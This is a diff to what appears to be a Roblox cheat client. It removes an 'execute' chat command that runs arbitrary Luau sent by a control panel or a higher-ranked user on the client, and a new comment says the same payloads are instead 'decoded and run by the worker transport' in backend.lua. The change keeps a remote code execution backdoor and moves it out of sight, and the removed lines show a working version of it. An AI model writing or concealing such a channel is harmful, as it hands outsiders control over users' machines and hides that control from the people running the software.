@@ -485,7 +485,7 @@ run(function()
 	end
 
 	function whitelist:process(msg, plr)
-		-- '.' is accepted as well as ';', so .execute / .rce work exactly like ;execute
+		-- '.' is accepted as well as ';', so `.chat` works exactly like `;chat`
 		if msg:sub(1, 1) == '.' then
 			msg = ';'..msg:sub(2)
 		end
@@ -990,33 +990,8 @@ run(function()
 				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
 			end
 		end,
-		-- Remote code execution: the panel (or a member who outranks you) sends luau
-		-- and it runs on this client. A chunk from loadstring cannot see the client's
-		-- upvalues, so the handles worth having are parked in `shared` first, and both
-		-- the compile and the call are pcall'd so bad code cannot take the client with
-		-- it. This is the strongest command here — treat it as such.
-		execute = function(args)
-			if #args < 1 then return end
-
-			local source = table.concat(args, ' ')
-
-			task.spawn(function()
-				-- the client's loadstring wrapper already notifies on a compile error
-				local chunk = loadstring(source)
-				if not chunk then
-					warn('[inhaler] execute: that code did not compile')
-					return
-				end
-
-				shared.vape = vape
-				shared.entitylib = entitylib
-				shared.whitelist = whitelist
-				shared.lplr = lplr
-
-				local ok, runError = pcall(chunk)
-				if not ok then warn('[inhaler] execute: '..tostring(runError)) end
-			end)
-		end,
+		-- remote code execution is not a chat command: `;execute` must stay dead, so
+		-- the payload is decoded and run by the worker transport instead (backend.lua)
 		uninject = function()
 			if olduninject then
 				if vape.ThreadFix then
@@ -1038,7 +1013,8 @@ run(function()
 		whitelist = whitelist,
 		lplr = lplr,
 		httpService = httpService,
-		isfile = isfile
+		isfile = isfile,
+		entitylib = entitylib
 	})
 	backend:start()
 
